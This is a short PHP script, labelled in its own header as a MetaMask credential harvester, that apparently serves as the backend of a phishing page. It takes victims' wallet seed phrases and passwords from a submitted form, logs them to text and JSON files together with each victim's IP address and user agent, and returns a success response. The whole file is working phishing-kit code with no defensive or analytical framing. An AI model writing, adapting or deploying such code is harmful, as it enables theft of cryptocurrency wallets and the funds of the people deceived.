<?php
// ingenieriasocial - MetaMask Credential Harvester
// Creado por: MidasOrion

$log_file = 'captured_credentials.txt';
$seed_phrase = isset($_POST['seed_phrase']) ? $_POST['seed_phrase'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

$log_entry = "═══════════════════════════════════════════════════════════\n";
$log_entry .= "METAMASK - Credenciales Capturadas\n";
$log_entry .= "═══════════════════════════════════════════════════════════\n";
$log_entry .= "Fecha/Hora: $timestamp\n";
$log_entry .= "Frase de Recuperación: $seed_phrase\n";
$log_entry .= "Contraseña: $password\n";
$log_entry .= "IP: $ip\n";
$log_entry .= "User-Agent: $user_agent\n";
$log_entry .= "═══════════════════════════════════════════════════════════\n\n";

file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

$json_file = 'captured_credentials.json';
$json_data = array(
    'platform' => 'MetaMask',
    'timestamp' => $timestamp,
    'seed_phrase' => $seed_phrase,
    'password' => $password,
    'ip' => $ip,
    'user_agent' => $user_agent
);

$existing_data = array();
if (file_exists($json_file)) {
    $existing_data = json_decode(file_get_contents($json_file), true);
    if (!is_array($existing_data)) {
        $existing_data = array();
    }
}

$existing_data[] = $json_data;
file_put_contents($json_file, json_encode($existing_data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

header('Content-Type: application/json');
echo json_encode(array('status' => 'success'));
exit();
?>
